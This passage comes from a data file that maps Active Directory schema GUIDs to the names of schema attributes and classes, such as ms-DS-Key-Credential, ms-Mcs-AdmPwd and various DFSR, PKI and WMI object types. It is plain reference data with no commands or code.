	"b6e5e988-e5e4-4c86-a2ae-0dacb970a0e1": "ms-DS-Custom-Key-Information",
	"dffbd720-0872-402e-9940-fcd78db049ba": "ms-DS-Computer-SID",
	"642c1129-3899-4721-8e21-4839e3988ce5": "ms-DS-Device-DN",
	"d1328fbc-8574-4150-881d-0b1088827878": "ms-DS-Key-Principal-BL",
	"bd61253b-9401-4139-a693-356fc400f3ea": "ms-DS-Key-Principal",
	"de71b44c-29ba-4597-9eca-c3348ace1917": "ms-DS-Key-Usage",
	"a12e0e9f-dedb-4f31-8f21-1311b958182f": "ms-DS-Key-Material",
	"c294f84b-2fad-4b71-be4c-9fc5701f60ba": "ms-DS-Key-Id",
	"59527d0f-b7c0-4ce2-a1dd-71cef6963292": "ms-DS-Is-Compliant",
	"bd29bf90-66ad-40e1-887b-10df070419a6": "ms-DS-External-Directory-Object-Id",
	"f60a8f96-57c4-422c-a3ad-9e2fa09ce6f7": "ms-DS-Device-MDMStatus",
	"f2f51102-6be0-493d-8726-1546cdbc8771": "ms-DS-AuthN-Policy-Silo-Enforced",
	"7a560cc2-ec45-44ba-b2d7-21236ad59fd5": "ms-DS-AuthN-Policy-Enforced",
	"2d131b3c-d39f-4aee-815e-8db4bc1ce7ac": "ms-DS-Assigned-AuthN-Policy-BL",
	"b87a0ad8-54f7-49c1-84a0-e64d12853588": "ms-DS-Assigned-AuthN-Policy",
	"2c1128ec-5aa2-42a3-b32d-f0979ca9fcd2": "ms-DS-Service-AuthN-Policy-BL",
	"2a6a6d95-28ce-49ee-bb24-6d1fc01e3111": "ms-DS-Service-AuthN-Policy",
	"2bef6232-30a1-457e-8604-7af6dbf131b8": "ms-DS-Computer-AuthN-Policy-BL",
	"afb863c9-bea3-440f-a9f3-6153cc668929": "ms-DS-Computer-AuthN-Policy",
	"2f17faa9-5d47-4b1f-977e-aa52fabe65c8": "ms-DS-User-AuthN-Policy-BL",
	"cd26b9f3-d415-442a-8f78-7c61523ee95b": "ms-DS-User-AuthN-Policy",
	"11fccbc7-fbe4-4951-b4b7-addf6f9efd44": "ms-DS-AuthN-Policy-Silo-Members-BL",
	"164d1e05-48a6-4886-a8e9-77a2006e3c77": "ms-DS-AuthN-Policy-Silo-Members",
	"33140514-f57a-47d2-8ec4-04c4666600c7": "ms-DS-Assigned-AuthN-Policy-Silo-BL",
	"b23fc141-0df5-4aea-b33d-6cf493077b3f": "ms-DS-Assigned-AuthN-Policy-Silo",
	"5dfe3c20-ca29-407d-9bab-8421e55eb75c": "ms-DS-Service-TGT-Lifetime",
	"97da709a-3716-4966-b1d1-838ba53c3d89": "ms-DS-Service-Allowed-To-Authenticate-From",
	"f2973131-9b4d-4820-b4de-0474ef3b849f": "ms-DS-Service-Allowed-To-Authenticate-To",
	"2e937524-dfb9-4cac-a436-a5b7da64fd66": "ms-DS-Computer-TGT-Lifetime",
	"105babe9-077e-4793-b974-ef0410b62573": "ms-DS-Computer-Allowed-To-Authenticate-To",
	"8521c983-f599-420f-b9ab-b1222bdf95c1": "ms-DS-User-TGT-Lifetime",
	"2c4c9600-b0e1-447d-8dda-74902257bdb5": "ms-DS-User-Allowed-To-Authenticate-From",
	"de0caa7f-724e-4286-b179-192671efc664": "ms-DS-User-Allowed-To-Authenticate-To",
	"b7acc3d2-2a74-4fa4-ac25-e63fe8b61218": "ms-DS-SyncServerUrl",
	"89848328-7c4e-4f6f-a013-28ce3ad282dc": "ms-DS-Cloud-IsEnabled",
	"a1e8b54f-4bd6-4fd2-98e2-bcee92a55497": "ms-DS-Cloud-Issuer-Public-Certificates",
	"78565e80-03d4-4fe3-afac-8c3bca2f3653": "ms-DS-Cloud-Anchor",
	"5315ba8e-958f-4b52-bd38-1349a304dd63": "ms-DS-Cloud-IsManaged",
	"60686ace-6c27-43de-a4e5-f00c2f8d3309": "ms-DS-IsManaged",
	"b5f1edfe-b4d2-4076-ab0f-6148342b0bf6": "ms-DS-Issuer-Public-Certificates",
	"6055f766-202e-49cd-a8be-e52bb159edfb": "ms-DS-Drs-Farm-ID",
	"1e02d2ef-44ad-46b2-a67d-9fd18d780bca": "ms-DS-Repl-Value-Meta-Data-Ext",
	"b918fe7d-971a-f404-9e21-9261abec970b": "ms-DS-Parent-Dist-Name",
	"e215395b-9104-44d9-b894-399ec9e21dfc": "ms-DS-Member-Transitive",
	"862166b6-c941-4727-9565-48bfff2941de": "ms-DS-Is-Member-Of-DL-Transitive",
	"ef65695a-f179-4e6a-93de-b01e06681cfb": "ms-DS-Device-Object-Version",
	"c30181c7-6342-41fb-b279-f7c566cbe0a7": "ms-DS-Device-ID",
	"90615414-a2a0-4447-a993-53409599b74e": "ms-DS-Device-Physical-IDs",
	"70fb8c63-5fab-4504-ab9d-14b329a8a7f8": "ms-DS-Device-OS-Version",
	"100e454d-f3bb-4dcb-845f-8d5edc471c59": "ms-DS-Device-OS-Type",
	"22a95c0e-1f83-4c82-94ce-bea688cfc871": "ms-DS-Is-Enabled",
	"a34f983b-84c6-4f0c-9050-a3a14a1d35a4": "ms-DS-Approximate-Last-Logon-Time-Stamp",
	"0449160c-5a8e-4fc8-b052-01c0f6e48f02": "ms-DS-Registered-Users",
	"617626e9-01eb-42cf-991f-ce617982237e": "ms-DS-Registered-Owner",
	"e3fb56c8-5de8-45f5-b1b1-d2b6cd31e762": "ms-DS-Device-Location",
	"0a5caa39-05e6-49ca-b808-025b936610e7": "ms-DS-Maximum-Registration-Inactivity-Period",
	"ca3286c2-1f64-4079-96bc-e62b610e730f": "ms-DS-Registration-Quota",
	"6b3d6fda-0893-43c4-89fb-1fb52a6616a9": "ms-DS-Issuer-Certificates",
	"f5446328-8b6e-498d-95a8-211748d5acdc": "ms-DS-cloudExtensionAttribute20",
	"0975fe99-9607-468a-8e18-c800d3387395": "ms-DS-cloudExtensionAttribute19",
	"88e73b34-0aa6-4469-9842-6eb01b32a5b5": "ms-DS-cloudExtensionAttribute18",
	"3d3c6dda-6be8-4229-967e-2ff5bb93b4ce": "ms-DS-cloudExtensionAttribute17",
	"9581215b-5196-4053-a11e-6ffcafc62c4d": "ms-DS-cloudExtensionAttribute16",
	"aae4d537-8af0-4daa-9cc6-62eadb84ff03": "ms-DS-cloudExtensionAttribute15",
	"cebcb6ba-6e80-4927-8560-98feca086a9f": "ms-DS-cloudExtensionAttribute14",
	"28be464b-ab90-4b79-a6b0-df437431d036": "ms-DS-cloudExtensionAttribute13",
	"3c01c43d-e10b-4fca-92b2-4cf615d5b09a": "ms-DS-cloudExtensionAttribute12",
	"9e9ebbc8-7da5-42a6-8925-244e12a56e24": "ms-DS-cloudExtensionAttribute11",
	"670afcb3-13bd-47fc-90b3-0a527ed81ab7": "ms-DS-cloudExtensionAttribute10",
	"0a63e12c-3040-4441-ae26-cd95af0d247e": "ms-DS-cloudExtensionAttribute9",
	"3cd1c514-8449-44ca-81c0-021781800d2a": "ms-DS-cloudExtensionAttribute8",
	"4a7c1319-e34e-40c2-9d00-60ff7890f207": "ms-DS-cloudExtensionAttribute7",
	"60452679-28e1-4bec-ace3-712833361456": "ms-DS-cloudExtensionAttribute6",
	"2915e85b-e347-4852-aabb-22e5a651c864": "ms-DS-cloudExtensionAttribute5",
	"9cbf3437-4e6e-485b-b291-22b02554273f": "ms-DS-cloudExtensionAttribute4",
	"82f6c81a-fada-4a0d-b0f7-706d46838eb5": "ms-DS-cloudExtensionAttribute3",
	"f34ee0ac-c0c1-4ba9-82c9-1a90752f16a5": "ms-DS-cloudExtensionAttribute2",
	"9709eaaf-49da-4db2-908a-0446e5eab844": "ms-DS-cloudExtensionAttribute1",
	"24977c8c-c1b7-3340-b4f6-2b375eb711d7": "ms-DS-RID-Pool-Allocation-Enabled",
	"693f2006-5764-3d4a-8439-58f04aab4b59": "ms-DS-Applies-To-Resource-Types",
	"0bb49a10-536b-bc4d-a273-0bab0dd4bd10": "ms-DS-Transformation-Rules-Compiled",
	"5a5661a1-97c6-544b-8056-e430fe7bc554": "ms-DS-TDO-Ingress-BL",
	"d5006229-9913-2242-8b17-83761d1e0e5b": "ms-DS-TDO-Egress-BL",
	"c137427e-9a73-b040-9190-1b095bb43288": "ms-DS-Egress-Claims-Transformation-Policy",
	"86284c08-0c6e-1540-8b15-75147d23d20d": "ms-DS-Ingress-Claims-Transformation-Policy",
	"55872b71-c4b2-3b48-ae51-4095f91ec600": "ms-DS-Transformation-Rules",
	"94c42110-bae4-4cea-8577-af813af5da25": "ms-DS-GeoCoordinates-Longitude",
	"dc66d44e-3d43-40f5-85c5-3c12e169927e": "ms-DS-GeoCoordinates-Latitude",
	"a11703b7-5641-4d9c-863e-5fb3325e74e0": "ms-DS-GeoCoordinates-Altitude",
	"888eedd6-ce04-df40-b462-b8a50e41ba38": "ms-DS-GroupMSAMembership",
	"1c332fe0-0c2a-4f32-afca-23c5e45a9e77": "ms-DFSR-ReplicationGroup",
	"7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6": "ms-DFSR-GlobalSettings",
	"67212414-7bcc-4609-87e0-088dad8abdee": "ms-DFSR-Subscription",
	"e11505d7-92c4-43e7-bf5c-295832ffc896": "ms-DFSR-Subscriber",
	"fa85c591-197f-477e-83bd-ea5a43df2239": "ms-DFSR-LocalSettings",
	"d03d6858-06f4-11d2-aa53-00c04fd7d83a": "ms-Exch-Configuration-Container",
	"ce206244-5827-4a86-ba1c-1c0c386c1b64": "ms-DS-Managed-Service-Account",
	"de91fc26-bd02-4b52-ae26-795999e96fc7": "ms-DS-Quota-Control",
	"da83fc4f-076f-4aea-b4dc-8f4dab9b5993": "ms-DS-Quota-Container",
	"5b06b06a-4cf3-44c0-bd16-43bc10a987da": "ms-DS-Password-Settings-Container",
	"3bcd9db8-f84b-451c-952f-6c52b81f9ec6": "ms-DS-Password-Settings",
	"44f00041-35af-468b-b20a-6ce8737c580b": "ms-DS-Optional-Feature",
	"1ed3a473-9b1b-418a-bfa0-3a37b95a5306": "ms-DS-Az-Task",
	"4feae054-ce55-47bb-860e-5b12063a51de": "ms-DS-Az-Scope",
	"8213eac9-9d55-44dc-925c-e9a52b927644": "ms-DS-Az-Role",
	"860abe37-9a9b-4fa4-b3d2-b8ace5df9ec5": "ms-DS-Az-Operation",
	"ddf8de9b-cba5-4e12-842e-28d8b66f75ec": "ms-DS-Az-Application",
	"cfee1051-5f28-4bae-a863-5d0cc18a8ed1": "ms-DS-Az-Admin-Manager",
	"9e67d761-e327-4d55-bc95-682f875e2f8e": "ms-DS-App-Data",
	"90df3c3e-1854-4455-a5d7-cad40d56657a": "ms-DS-App-Configuration",
	"250464ab-c417-497a-975a-9e0d459a7ca1": "ms-COM-PartitionSet",
	"c9010e74-4e58-49f7-8a89-5e3e2340fcf8": "ms-COM-Partition",
	"11b6cc94-48c4-11d1-a9c3-0000f80367c1": "Meeting",
	"bf967aa1-0de6-11d0-a285-00aa003049e2": "Mail-Recipient",
	"52ab8671-5709-11d1-a9c6-0000f80367c1": "Lost-And-Found",
	"bf967aa0-0de6-11d0-a285-00aa003049e2": "Locality",
	"ddac0cf4-af8f-11d0-afeb-00c04fd930c9": "Link-Track-Volume-Table",
	"ddac0cf6-af8f-11d0-afeb-00c04fd930c9": "Link-Track-Vol-Entry",
	"ddac0cf7-af8f-11d0-afeb-00c04fd930c9": "Link-Track-OMT-Entry",
	"ddac0cf5-af8f-11d0-afeb-00c04fd930c9": "Link-Track-Object-Move-Table",
	"1be8f17d-a9ff-11d0-afe2-00c04fd930c9": "Licensing-Site-Settings",
	"bf967a9e-0de6-11d0-a285-00aa003049e2": "Leaf",
	"b7b13121-b82e-11d0-afee-0000f80367c1": "Ipsec-Policy",
	"b40ff829-427a-11d1-a9c2-0000f80367c1": "Ipsec-NFA",
	"b40ff827-427a-11d1-a9c2-0000f80367c1": "Ipsec-Negotiation-Policy",
	"b40ff828-427a-11d1-a9c2-0000f80367c1": "Ipsec-ISAKMP-Policy",
	"b40ff826-427a-11d1-a9c2-0000f80367c1": "Ipsec-Filter",
	"b40ff825-427a-11d1-a9c2-0000f80367c1": "Ipsec-Base",
	"26d97375-6070-11d1-a9c6-0000f80367c1": "Inter-Site-Transport-Container",
	"26d97376-6070-11d1-a9c6-0000f80367c1": "Inter-Site-Transport",
	"07383085-91df-11d1-aebc-0000f80367c1": "Intellimirror-SCP",
	"07383086-91df-11d1-aebc-0000f80367c1": "Intellimirror-Group",
	"2df90d89-009f-11d2-aa4c-00c04fd7d83a": "Infrastructure-Update",
	"4828cc14-1437-45bc-9b07-ad6f015e5f28": "inetOrgPerson",
	"7bfdcb8a-4807-11d1-a9c3-0000f80367c1": "Index-Server-Catalog",
	"f30e3bc2-9ff0-11d1-b603-0000f80367c1": "Group-Policy-Container",
	"0310a911-93a3-4e21-a7a3-55d85ab2c48b": "groupOfUniqueNames",
	"bf967a9d-0de6-11d0-a285-00aa003049e2": "Group-Of-Names",
	"bf967a9c-0de6-11d0-a285-00aa003049e2": "Group",
	"8447f9f3-1027-11d0-a05f-00aa006c33ed": "FT-Dfs",
	"c498f152-dc6b-474a-9f52-7cdba3d7d351": "friendlyCountry",
	"89e31c12-8530-11d0-afda-00c04fd930c9": "Foreign-Security-Principal",
	"8e4eb2ed-4712-11d0-a1a0-00c04fd930c9": "File-Link-Tracking-Entry",
	"dd712229-10e4-11d0-a05f-00aa006c33ed": "File-Link-Tracking",
	"66d51249-3355-4c1f-b24e-81f252aca23b": "Dynamic-Object",
	"3fdfee52-47f4-11d1-a9c3-0000f80367c1": "DSA",
	"09b10f14-6f93-11d2-9905-0000f87a57d4": "DS-UI-Settings",
	"8bfd2d3d-efda-4549-852c-f85e137aedc6": "domainRelatedObject",
	"bf967a99-0de6-11d0-a285-00aa003049e2": "Domain-Policy",
	"19195a5b-6da0-11d0-afd3-00c04fd930c9": "Domain-DNS",
	"19195a5a-6da0-11d0-afd3-00c04fd930c9": "Domain",
	"7a2be07c-302f-4b96-bc90-0795d66885f8": "documentSeries",
	"39bad96d-c2d6-4baf-88ab-7e4207600117": "document",
	"e0fa1e8b-9b45-11d0-afdd-00c04fd930c9": "Dns-Zone",
	"e0fa1e8c-9b45-11d0-afdd-00c04fd930c9": "Dns-Node",
	"5fd4250c-1262-11d0-a060-00aa006c33ed": "Display-Template",
	"e0fa1e8a-9b45-11d0-afdd-00c04fd930c9": "Display-Specifier",
	"963d2756-48be-11d1-a9c3-0000f80367c1": "DHCP-Class",
	"8447f9f2-1027-11d0-a05f-00aa006c33ed": "Dfs-Configuration",
	"bf967a8e-0de6-11d0-a285-00aa003049e2": "Device",
	"ef9e60e0-56f7-11d1-a9c6-0000f80367c1": "Cross-Ref-Container",
	"bf967a8d-0de6-11d0-a285-00aa003049e2": "Cross-Ref",
	"167758ca-47f3-11d1-a9c3-0000f80367c1": "CRL-Distribution-Point",
	"bf967a8c-0de6-11d0-a285-00aa003049e2": "Country",
	"8297931e-86d3-11d0-afda-00c04fd930c9": "Control-Access-Right",
	"bf967a8b-0de6-11d0-a285-00aa003049e2": "Container",
	"bf967aa7-0de6-11d0-a285-00aa003049e2": "Person",
	"5cb41ed0-0e4c-11d0-a286-00aa003049e2": "Contact",
	"5cb41ecf-0e4c-11d0-a286-00aa003049e2": "Connection-Point",
	"bf967a87-0de6-11d0-a285-00aa003049e2": "Configuration",
	"bf967a86-0de6-11d0-a285-00aa003049e2": "Computer",
	"bf967a85-0de6-11d0-a285-00aa003049e2": "Com-Connection-Point",
	"bf967a84-0de6-11d0-a285-00aa003049e2": "Class-Store",
	"bf967a82-0de6-11d0-a285-00aa003049e2": "Class-Registration",
	"3fdfee50-47f4-11d1-a9c3-0000f80367c1": "Certification-Authority",
	"7d6c0e9d-7e20-11d0-afd6-00c04fd930c9": "Category-Registration",
	"bf967a81-0de6-11d0-a285-00aa003049e2": "Builtin-Domain",
	"ddc790ac-af4d-442a-8f0f-a1d4caa7dd92": "Application-Version",
	"19195a5c-6da0-11d0-afd3-00c04fd930c9": "Application-Site-Settings",
	"f780acc1-56f0-11d1-a9c6-0000f80367c1": "Application-Settings",
	"5fd4250b-1262-11d0-a060-00aa006c33ed": "Application-Process",
	"3fdfee4f-47f4-11d1-a9c3-0000f80367c1": "Application-Entity",
	"5fd4250a-1262-11d0-a060-00aa006c33ed": "Address-Template",
	"3e74f60f-3e73-11d1-a9c0-0000f80367c1": "Address-Book-Container",
	"7f561289-5301-11d1-a9c5-0000f80367c1": "ACS-Subnet",
	"2e899b04-2834-11d3-91d4-0000f87a57d4": "ACS-Resource-Limits",
	"7f561288-5301-11d1-a9c5-0000f80367c1": "ACS-Policy",
	"bf967a83-0de6-11d0-a285-00aa003049e2": "Class-Schema",
	"2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e": "account",
	"34f6bdf5-2e79-4c3b-8e14-3d93b75aab89": "ms-DS-Object-SOA",
	"b7b13125-b82e-11d0-afee-0000f80367c1": "Subnet-Container",
	"b7b13124-b82e-11d0-afee-0000f80367c1": "Subnet",
	"bf967ab5-0de6-11d0-a285-00aa003049e2": "Storage",
	"7a4117da-cd67-11d0-afff-0000f80367c1": "Sites-Container",
	"d50c2cdf-8951-11d1-aebc-0000f80367c1": "Site-Link-Bridge",
	"d50c2cde-8951-11d1-aebc-0000f80367c1": "Site-Link",
	"bf967ab3-0de6-11d0-a285-00aa003049e2": "Site",
	"5fe69b0b-e146-4f15-b0ab-c1e5d488e094": "simpleSecurityObject",
	"bf967ab2-0de6-11d0-a285-00aa003049e2": "Service-Instance",
	"28630ec1-41d5-11d1-a9c1-0000f80367c1": "Service-Connection-Point",
	"bf967ab1-0de6-11d0-a285-00aa003049e2": "Service-Class",
	"b7b13123-b82e-11d0-afee-0000f80367c1": "Service-Administration-Point",
	"f780acc0-56f0-11d1-a9c6-0000f80367c1": "Servers-Container",
	"bf967a92-0de6-11d0-a285-00aa003049e2": "Server",
	"bf967ab0-0de6-11d0-a285-00aa003049e2": "Security-Principal",
	"bf967aaf-0de6-11d0-a285-00aa003049e2": "Security-Object",
	"bf967aae-0de6-11d0-a285-00aa003049e2": "Secret",
	"bf967aad-0de6-11d0-a285-00aa003049e2": "Sam-Server",
	"bf967a91-0de6-11d0-a285-00aa003049e2": "Sam-Domain-Base",
	"bf967a90-0de6-11d0-a285-00aa003049e2": "Sam-Domain",
	"f39b98ae-938d-11d1-aebd-0000f80367c1": "RRAS-Administration-Dictionary",
	"2a39c5be-8960-11d1-aebc-0000f80367c1": "RRAS-Administration-Connection-Point",
	"f29653d0-7ad0-11d0-afd6-00c04fd930c9": "rpc-Server-Element",
	"88611be0-8cf4-11d0-afda-00c04fd930c9": "rpc-Server",
	"f29653cf-7ad0-11d0-afd6-00c04fd930c9": "rpc-Profile-Element",
	"88611be1-8cf4-11d0-afda-00c04fd930c9": "rpc-Profile",
	"88611bdf-8cf4-11d0-afda-00c04fd930c9": "rpc-Group",
	"bf967aac-0de6-11d0-a285-00aa003049e2": "rpc-Entry",
	"80212842-4bdc-11d1-a9c4-0000f80367c1": "Rpc-Container",
	"7860e5d2-c8b0-4cbb-bd45-d9455beb9206": "room",
	"7bfdcb89-4807-11d1-a9c3-0000f80367c1": "RID-Set",
	"6617188d-8f3c-11d0-afda-00c04fd930c9": "RID-Manager",
	"b93e3a78-cbae-485e-a07b-5ef4ae505686": "rFC822LocalPart",
	"a8df74d6-c5ea-11d1-bbcb-0080c76670c0": "Residential-Person",
	"2a39c5bd-8960-11d1-aebc-0000f80367c1": "Remote-Storage-Service-Point",
	"bf967aa9-0de6-11d0-a285-00aa003049e2": "Remote-Mail-Recipient",
	"83cc7075-cca7-11d0-afff-0000f80367c1": "Query-Policy",
	"bf967aa8-0de6-11d0-a285-00aa003049e2": "Print-Queue",
	"1562a632-44b9-4a7e-a2d3-e426c96a3acc": "ms-PKI-Private-Key-Recovery-Agent",
	"ee4aa692-3bba-11d2-90cc-00c04fd91ab1": "PKI-Enrollment-Service",
	"e5209ca2-3bba-11d2-90cc-00c04fd91ab1": "PKI-Certificate-Template",
	"b7b13122-b82e-11d0-afee-0000f80367c1": "Physical-Location",
	"bf967aa6-0de6-11d0-a285-00aa003049e2": "Package-Registration",
	"bf967aa5-0de6-11d0-a285-00aa003049e2": "Organizational-Unit",
	"a8df74bf-c5ea-11d1-bbcb-0080c76670c0": "Organizational-Role",
	"bf967aa4-0de6-11d0-a285-00aa003049e2": "Organizational-Person",
	"2a132587-9373-11d1-aebc-0000f80367c1": "NTFRS-Subscriptions",
	"2a132588-9373-11d1-aebc-0000f80367c1": "NTFRS-Subscriber",
	"f780acc2-56f0-11d1-a9c6-0000f80367c1": "NTFRS-Settings",
	"5245803a-ca6a-11d0-afff-0000f80367c1": "NTFRS-Replica-Set",
	"2a132586-9373-11d1-aebc-0000f80367c1": "NTFRS-Member",
	"19195a5d-6da0-11d0-afd3-00c04fd930c9": "NTDS-Site-Settings",
	"19195a5f-6da0-11d0-afd3-00c04fd930c9": "NTDS-Service",
	"85d16ec1-0791-4bc8-8ab3-70980602ff8c": "NTDS-DSA-RO",
	"19195a60-6da0-11d0-afd3-00c04fd930c9": "NTDS-Connection",
	"9a0dc346-c100-11d1-bbc5-0080c76670c0": "MSMQ-Site-Link",
	"9a0dc347-c100-11d1-bbc5-0080c76670c0": "MSMQ-Settings",
	"9a0dc343-c100-11d1-bbc5-0080c76670c0": "MSMQ-Queue",
	"50776997-3c3d-11d2-90cc-00c04fd91ab1": "MSMQ-Migrated-User",
	"46b27aac-aafa-4ffb-b773-e5bf621ee87b": "MSMQ-Group",
	"9a0dc345-c100-11d1-bbc5-0080c76670c0": "MSMQ-Enterprise-Settings",
	"876d6817-35cc-436c-acea-5ef7174dd9be": "MSMQ-Custom-Recipient",
	"9a0dc344-c100-11d1-bbc5-0080c76670c0": "MSMQ-Configuration",
	"05630000-3927-4ede-bf27-ca91f275c26f": "ms-WMI-WMIGPO",
	"b82ac26b-c6db-4098-92c6-49c18a3336e1": "ms-WMI-UnknownRangeParam",
	"8f4beb31-4e19-46f5-932e-5fa03c339b1d": "ms-WMI-UintSetParam",
	"d9a799b2-cef3-48b3-b5ad-fb85f8dd3214": "ms-WMI-UintRangeParam",
	"0bc579a2-1da7-4cea-b699-807f3b9d63a4": "ms-WMI-StringSetParam",
	"ab857078-0142-4406-945b-34c9b6b13372": "ms-WMI-Som",
	"6cc8b2b5-12df-44f6-8307-e74f5cdee369": "ms-WMI-SimplePolicyTemplate",
	"f1e44bdf-8dd3-4235-9c86-f91f31f5b569": "ms-WMI-ShadowObject",
	"3c7e6f83-dd0e-481b-a0c2-74cd96ef2a66": "ms-WMI-Rule",
	"6afe8fe2-70bc-4cce-b166-a96f7359c514": "ms-WMI-RealRangeParam",
	"45fb5a57-5018-4d0f-9056-997c8c9122d9": "ms-WMI-RangeParam",
	"595b2613-4109-4e77-9013-a3bb4ef277c7": "ms-WMI-PolicyType",
	"e2bc80f1-244a-4d59-acc6-ca5c4f82e6e1": "ms-WMI-PolicyTemplate",
	"55dd81c9-c312-41f9-a84d-c6adbdf1e8e1": "ms-WMI-ObjectEncoding",
	"07502414-fdca-4851-b04a-13645b11d226": "ms-WMI-MergeablePolicyTemplate",
	"292f0d9a-cf76-42b0-841f-b650f331df62": "ms-WMI-IntSetParam",
	"50ca5d7d-5c8b-4ef3-b9df-5b66d491e526": "ms-WMI-IntRangeParam",
	"53ea1cb5-b704-4df9-818f-5cb4ec86cac1": "ms-TAPI-Rt-Person",
	"ca7b9735-4b2a-4e49-89c3-99025334dc94": "ms-TAPI-Rt-Conference",
	"09f0506a-cd28-11d2-9993-0000f87a57d4": "MS-SQL-OLAPCube",
	"20af031a-ccef-11d2-9993-0000f87a57d4": "MS-SQL-OLAPDatabase",
	"1d08694a-ccef-11d2-9993-0000f87a57d4": "MS-SQL-SQLDatabase",
	"17c2f64e-ccef-11d2-9993-0000f87a57d4": "MS-SQL-SQLPublication",
	"11d43c5c-ccef-11d2-9993-0000f87a57d4": "MS-SQL-SQLRepository",
	"0c7e18ea-ccef-11d2-9993-0000f87a57d4": "MS-SQL-OLAPServer",
	"05f6c878-ccef-11d2-9993-0000f87a57d4": "MS-SQL-SQLServer",
	"26ccf238-a08e-4b86-9a82-a8c9ac7ee5cb": "ms-PKI-Key-Recovery-Agent",
	"37cfd85c-6719-4ad8-8f9e-8678ba627563": "ms-PKI-Enterprise-Oid",
	"a16f33c7-7fd6-4828-9364-435138fda08d": "ms-Print-ConnectionPolicy",
	"1f7c257c-b8a3-4525-82f8-11ccc7bee36e": "ms-Imaging-PostScanProcess",
	"a0ed2ac1-970c-4777-848e-ec63a0ec44fc": "ms-Imaging-PSPs",
	"7b9a2d92-b7eb-4382-9772-c3e0f9baaf94": "ms-ieee-80211-Policy",
	"e58f972e-64b5-46ef-8d8b-bbc3e1897eab": "ms-DFSR-Connection",
	"4229c897-c211-437c-a5ae-dbf705b696e5": "ms-DFSR-Member",
	"04828aa9-6e42-4e80-b962-e2fe00754d17": "ms-DFSR-Topology",
	"4937f40d-a6dc-4d48-97ca-06e5fbfd3f16": "ms-DFSR-ContentSet",
	"64759b35-d3a1-42e4-b5f1-a3de162109b3": "ms-DFSR-Content",
	"83e2d5c6-bd4c-45d7-bf11-2ac70df5f4e0": "ms-Mcs-AdmPwd",
	"67119cd8-bd8f-43be-860d-23ff54d9f045": "ms-Mcs-AdmPwdExpirationTime",
	"696f8a61-2d3f-40ce-a4b3-e275dfcc49c5": "Dns-Zone-Scope",
	"f2699093-f25a-4220-9deb-03df4cc4a9c5": "Dns-Zone-Scope-Container",
	"770f4cb3-1643-469c-b766-edd77aa75e14": "ms-DS-Shadow-Principal",
	"11f95545-d712-4c50-b847-d2781537c633": "ms-DS-Shadow-Principal-Container",
	"ee1f5543-7c2e-476a-8b3f-e11f4af6c498": "ms-DS-Key-Credential",
	"ab6a1156-4dc7-40f5-9180-8e4ce42fe5cd": "ms-DS-AuthN-Policy",
	"f9f0461e-697d-4689-9299-37e61d617b0d": "ms-DS-AuthN-Policy-Silo",
	"3a9adf5d-7b97-4f7e-abb4-e5b55c1c06b4": "ms-DS-AuthN-Policies",
	"d2b1470a-8f84-491e-a752-b401ee00fe5c": "ms-DS-AuthN-Policy-Silos",
	"5df2b673-6d41-4774-b3e8-d52e8ee9ff99": "ms-DS-Device",
	"7c9e8c58-901b-4ea8-b6ec-4eb9e9fc0e11": "ms-DS-Device-Container",
	"96bc3a1a-e3d2-49d3-af11-7b0df79d67f5": "ms-DS-Device-Registration-Service",
	"310b55ce-3dcd-4392-a96d-c9e35397c24f": "ms-DS-Device-Registration-Service-Container",
	"641e87a4-8326-4771-ba2d-c706df35e35a": "ms-DS-Cloud-Extensions",
	"c8fca9b1-7d88-bb4f-827a-448927710762": "ms-DS-Claims-Transformation-Policies",
	"2eeb62b3-1373-fe45-8101-387f1676edc7": "ms-DS-Claims-Transformation-Policy-Type",
	"e3c27fdf-b01d-4f4e-87e7-056eef0eb922": "ms-DS-Value-Type",
	"7b8b558a-93a5-4af7-adca-c017e67f1057": "ms-DS-Group-Managed-Service-Account",
	"aa02fd41-17e0-4f18-8687-b2239649736b": "ms-Kds-Prov-RootKey",
	"5ef243a8-2a25-45a6-8b73-08a71ae677ce": "ms-Kds-Prov-ServerConfiguration",
	"a5679cb0-6f9d-432c-8b75-1e3e834f02aa": "ms-Authz-Central-Access-Policy",
	"5b4a06dc-251c-4edb-8813-0bdd71327226": "ms-Authz-Central-Access-Rule",
	"99bb1b7a-606d-4f8b-800e-e15be554ca8d": "ms-Authz-Central-Access-Rules",
	"555c21c3-a136-455a-9397-796bbd358e25": "ms-Authz-Central-Access-Policies",
	"ef2fc3ed-6e18-415b-99e4-3114a8cb124b": "ms-DNS-Server-Settings",
	"85045b6a-47a6-4243-a7cc-6890701f662c": "ms-TPM-Information-Object",
	"e027a8bd-6456-45de-90a3-38593877ee74": "ms-TPM-Information-Objects-Container",
	"51a0e68c-0dc5-43ca-935d-c1c911bf2ee5": "ms-SPP-Activation-Object",
	"b72f862b-bb25-4d5d-aa51-62c59bdf90ae": "ms-SPP-Activation-Objects-Container",
	"72e3d47a-b342-4d45-8f56-baff803cabf9": "ms-DS-Resource-Property-List",
	"5b283d5e-8404-4195-9339-8450188c501a": "ms-DS-Resource-Property",
	"81a3857c-5469-4d8f-aae6-c27699762604": "ms-DS-Claim-Type",
	"7a4a4584-b350-478f-acd6-b4b852d82cc0": "ms-DS-Resource-Properties",
	"36093235-c715-4821-ab6a-b56fb2805a58": "ms-DS-Claim-Types",
	"b8442f58-c490-4487-8a9d-d80b883271ad": "ms-DS-Claim-Type-Property-Base",
	"b1cba91a-0682-4362-a659-153e201ef069": "Template-Roots2",
	"4898f63d-4112-477c-8826-3ca00bd8277d": "Global-Address-List2",
	"508ca374-a511-4e4e-9f4f-856f61a6b7e4": "Address-Book-Roots2",
	"21cb8628-f3c3-4bbf-bff6-060b2d8f299a": "ms-DFS-Namespace-v2",
	"da73a085-6e64-4d61-b064-015d04164795": "ms-DFS-Namespace-Anchor",
	"7769fb7a-1159-4e96-9ccd-68bc487073eb": "ms-DFS-Link-v2",
	"25173408-04ca-40e8-865e-3f9ce9bf1bd3": "ms-DFS-Deleted-Link-v2",
	"ea715d30-8f53-40d0-bd1e-6109186d782c": "ms-FVE-RecoveryInformation",
	"99a03a6a-ab19-4446-9350-0cb878ed2d9b": "ms-net-ieee-8023-GroupPolicy",
	"1cb81863-b822-4379-9ea2-5ff7bdc6386d": "ms-net-ieee-80211-GroupPolicy",
	"faf733d0-f8eb-4dcf-8d75-f1753af6a50b": "msSFU-30-NIS-Map-Config",
	"e15334a3-0bf0-4427-b672-11f5d84acc92": "msSFU-30-Network-User",
	"36297dce-656b-4423-ab65-dabb2770819e": "msSFU-30-Domain-Info",
